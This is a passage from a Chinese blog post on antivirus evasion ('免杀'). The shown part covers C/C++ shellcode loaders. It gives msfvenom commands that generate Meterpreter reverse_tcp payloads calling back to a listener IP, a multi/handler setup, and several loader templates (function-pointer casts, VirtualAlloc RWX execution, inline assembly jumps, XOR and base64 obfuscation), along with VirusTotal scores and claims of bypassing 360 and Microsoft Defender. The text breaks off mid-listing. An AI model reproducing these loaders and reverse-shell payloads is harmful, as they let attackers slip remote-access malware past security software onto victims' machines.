<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>免杀二-脚本语言免杀 | senu11</title><meta name="author" content="senu11"><meta name="copyright" content="senu11"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文介绍C&#x2F;C++、python、C#、powershell、go五种语言的常见的免杀方法">
<meta property="og:type" content="article">
<meta property="og:title" content="免杀二-脚本语言免杀">
<meta property="og:url" content="http://example.com/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
<meta property="og:site_name" content="senu11">
<meta property="og:description" content="本文介绍C&#x2F;C++、python、C#、powershell、go五种语言的常见的免杀方法">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/1.png">
<meta property="article:published_time" content="2020-10-04T08:24:00.000Z">
<meta property="article:modified_time" content="2024-05-17T09:10:17.245Z">
<meta property="article:author" content="senu11">
<meta property="article:tag" content="C&#x2F;C++之11种方法免杀">
<meta property="article:tag" content="python之7种免杀方法">
<meta property="article:tag" content="c#之5种免杀方法">
<meta property="article:tag" content="powershell之4种免杀方法">
<meta property="article:tag" content="go之3种免杀方法">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/1.png"><link rel="shortcut icon" href="/img/head.png"><link rel="canonical" href="http://example.com/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"簡","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":730,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: senu11","link":"链接: ","source":"来源: senu11","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '免杀二-脚本语言免杀',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-17 17:10:17'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">133</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="senu11"><span class="site-name">senu11</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">免杀二-脚本语言免杀</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-04T08:24:00.000Z" title="发表于 2020-10-04 16:24:00">2020-10-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-17T09:10:17.245Z" title="更新于 2024-05-17 17:10:17">2024-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>47分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="免杀二-脚本语言免杀"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本文介绍C&#x2F;C++、python、C#、powershell、go五种语言的常见的免杀方法</p>
<span id="more"></span>
<h2 id="1-c-c"><a href="#1-c-c" class="headerlink" title="1.c&#x2F;c++"></a>1.c&#x2F;c++</h2><h3 id="1-源码编译（VT-24-70，过360和微软）"><a href="#1-源码编译（VT-24-70，过360和微软）" class="headerlink" title="1.源码编译（VT:24&#x2F;70，过360和微软）"></a>1.源码编译（VT:24&#x2F;70，过360和微软）</h3><h4 id="1-指针执行"><a href="#1-指针执行" class="headerlink" title="1.指针执行"></a>1.指针执行</h4><p>msf生成shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.28 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure>

<p>vs2019编译生成的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned char buf[] =</span><br><span class="line"></span><br><span class="line">&quot;shellcode&quot;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line">    main()</span><br><span class="line">    &#123;</span><br><span class="line">        ( (void(*)(void))&amp;buf)();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在vs中选择debug，生成-生成project，生成的文件在debug目录下。</p>
<p>运行生成的exe，msf设置上线即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.3.30</span><br><span class="line">set LPORT 3333</span><br></pre></td></tr></table></figure>



<h4 id="2-申请动态内存加载（VT-26-69，过360）"><a href="#2-申请动态内存加载（VT-26-69，过360）" class="headerlink" title="2.申请动态内存加载（VT:26&#x2F;69，过360）"></a>2.申请动态内存加载（VT:26&#x2F;69，过360）</h4><p>下面的代码会申请一段动态内存，然后加载shellcode。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) //windows控制台程序不出黑窗口</span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;shellcode&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    char *Memory;</span><br><span class="line"></span><br><span class="line">    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(Memory, buf, sizeof(buf));</span><br><span class="line"></span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作和方法一一样。</p>
<h4 id="3-嵌入汇编加载（VT-23-70-）"><a href="#3-嵌入汇编加载（VT-23-70-）" class="headerlink" title="3.嵌入汇编加载（VT:23&#x2F;70 ）"></a>3.嵌入汇编加载（VT:23&#x2F;70 ）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4-强制类型转换"><a href="#4-强制类型转换" class="headerlink" title="4.强制类型转换"></a>4.强制类型转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char buf[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-汇编花指令"><a href="#5-汇编花指令" class="headerlink" title="5.汇编花指令"></a>5.汇编花指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="6-XOR加密-VT-23-70"><a href="#6-XOR加密-VT-23-70" class="headerlink" title="6.XOR加密(VT:23&#x2F;70 )"></a>6.XOR加密(VT:23&#x2F;70 )</h4><p>msf生成raw格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>

<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>/root/shellcode.raw</code>为msf生成的raw文件，<code>se_nell</code>为自己设置的key。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cpp /root/shellcode.raw se_null xor</span><br></pre></td></tr></table></figure>

<p>在vs2019中将上述几个实验的源码打开，源文件下的test.c改为test.cpp，粘贴<code>ShellcodeWrapper</code>生成的cpp文件，位置在<code>ShellcodeWrapper/ShellcodeWrapper/result/</code>下，debug生成project，执行即可，msf可上线，但是会出现弹窗。（注意生成的cpp文件第一行<code>#include &quot;stdafx.h&quot;</code>删除再生成project文件。）</p>
<h4 id="7-base64加密法"><a href="#7-base64加密法" class="headerlink" title="7.base64加密法"></a>7.base64加密法</h4><p><strong>方法一</strong></p>
<p>msf生成base64编码的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>

<p>将<code>shell.c</code>的内容复制到一下文件中，命名为<code>shellcode.c</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;msf base64 code here&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char str1[1000] = &#123; 0 &#125;;</span><br><span class="line">    Base64decode(str1, buf);</span><br><span class="line"></span><br><span class="line">    //printf(&quot;%d  &quot;, sizeof(str3));</span><br><span class="line">    char *Memory;</span><br><span class="line">    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(Memory, str1, sizeof(str1));</span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外需准备base64.c文件，内容如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span><br><span class="line">*/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;string.h&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span><br><span class="line">static const unsigned char pr2six[256] =</span><br><span class="line">&#123;</span><br><span class="line">    /* ASCII table */</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span><br><span class="line">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,</span><br><span class="line">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Base64decode_len(const char *bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char *bufin;</span><br><span class="line">    register int nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;= 63);</span><br><span class="line"></span><br><span class="line">    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span><br><span class="line"></span><br><span class="line">    return nbytesdecoded + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Base64decode(char *bufplain, const char *bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char *bufin;</span><br><span class="line">    register unsigned char *bufout;</span><br><span class="line">    register int nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;= 63);</span><br><span class="line">    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span><br><span class="line"></span><br><span class="line">    bufout = (unsigned char *)bufplain;</span><br><span class="line">    bufin = (const unsigned char *)bufcoded;</span><br><span class="line"></span><br><span class="line">    while (nprbytes &gt; 4) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">        bufin += 4;</span><br><span class="line">        nprbytes -= 4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Note: (nprbytes == 1) would be an error, so just ingore that case */</span><br><span class="line">    if (nprbytes &gt; 1) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 2) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 3) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(bufout++) = &#x27;\0&#x27;;</span><br><span class="line">    nbytesdecoded -= (4 - nprbytes) &amp; 3;</span><br><span class="line">    return nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static const char basis_64[] =</span><br><span class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span><br><span class="line"></span><br><span class="line">int Base64encode_len(int len)</span><br><span class="line">&#123;</span><br><span 